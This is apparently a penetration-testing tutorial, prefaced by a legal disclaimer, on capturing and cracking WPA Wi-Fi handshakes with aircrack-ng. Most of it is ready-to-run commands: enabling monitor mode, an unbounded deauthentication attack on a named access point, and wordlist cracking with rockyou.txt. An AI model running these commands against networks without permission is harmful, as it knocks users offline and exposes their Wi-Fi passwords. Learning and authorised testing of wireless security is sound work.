# Wi-Fi Monitor Mode & WPA Handshake Capture Guide

> ⚠️ **Legal Disclaimer:** This guide is intended for **authorized penetration testing and educational purposes only**. Only perform these actions on networks you own or have explicit written permission to test. Unauthorized access to computer networks is illegal.

---

## Prerequisites

- A wireless adapter that supports monitor mode
- Aircrack-ng suite installed
- Root / sudo privileges
- Wireshark installed
- `rockyou.txt` wordlist (see Step 5)

---

## Step 1 — Identify Your Wireless Adapters

```bash
ip addr       # List all network interfaces
iwconfig      # Show wireless interfaces and their current modes
```

Note down your wireless interface name (commonly `wlan0`).

---

## Step 2 — Enable Monitor Mode

### 2a. Kill Interfering Processes
```bash
sudo airmon-ng check kill
```
> This stops NetworkManager and other processes that may interfere.

### 2b. Start Monitor Mode
```bash
sudo airmon-ng start wlan0
```

### 2c. Verify Monitor Mode is Active
```bash
sudo airmon-ng    # Should show wlan0mon in the list
iwconfig          # Confirm interface mode shows "Monitor"
```

---

## Step 3 — Scan for Target Access Point

```bash
sudo airodump-ng wlan0mon
```

From the output, note down:

| Field | Value |
|-------|-------|
| **ESSID** (network name) | *(fill in your target)* |
| **BSSID** (AP MAC address) | *(fill in your target)* |
| **Channel** | *(fill in your target)* |

Press `Ctrl+C` once you have the information you need.

---

## Step 4 — Capture the WPA Handshake

Open **two terminal windows** for this step.

### Window 1 — Start Targeted Capture
```bash
# Replace: -c <channel>, --bssid <AP MAC>, and output filename as needed
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
```
> This saves the capture to a file (e.g., `hack1-01.cap`). Keep this running.

### Window 2 — Deauthentication Attack
```bash
# Replace the BSSID with your target AP's MAC address
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
```
> Sending deauth packets forces connected clients to re-authenticate, triggering a WPA handshake. Watch **Window 1** for the `WPA handshake:` confirmation message in the top-right corner.

---

## Step 5 — Analyze the Capture in Wireshark

```bash
wireshark hack1-01.cap
```

### Filter for EAPOL Packets
In the Wireshark filter bar, enter:
```
eapol
```
> EAPOL (Extensible Authentication Protocol over LAN) frames contain the WPA 4-way handshake. You should see at least 2–4 packets for a valid capture.

---

## Step 6 — Stop Monitor Mode

Once you're done capturing, restore your adapter to managed mode:

```bash
sudo airmon-ng stop wlan0mon
```

---

## Step 7 — Crack the Handshake

### Prepare the Wordlist
If using `rockyou.txt` and it's still compressed:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Run Aircrack-ng
```bash
# Replace hack1-01.cap with your capture filename
# Replace the BSSID and ESSID with your target values
aircrack-ng hack1-01.cap -b 90:9A:4A:B8:F3:FB -w /usr/share/wordlists/rockyou.txt
```

---

## Quick Reference — Command Summary

| Step | Command | Purpose |
|------|---------|---------|
| 1 | `ip addr` / `iwconfig` | Identify interfaces |
| 2 | `sudo airmon-ng check kill` | Kill interfering processes |
| 2 | `sudo airmon-ng start wlan0` | Enable monitor mode |
| 3 | `sudo airodump-ng wlan0mon` | Scan for APs |
| 4a | `sudo airodump-ng -w <file> -c <ch> --bssid <MAC> wlan0mon` | Capture handshake |
| 4b | `sudo aireplay-ng --deauth 0 -a <MAC> wlan0mon` | Force re-auth |
| 5 | `wireshark <file>.cap` → filter `eapol` | Inspect handshake |
| 6 | `sudo airmon-ng stop wlan0mon` | Disable monitor mode |
| 7 | `aircrack-ng <file>.cap -w rockyou.txt` | Crack password |
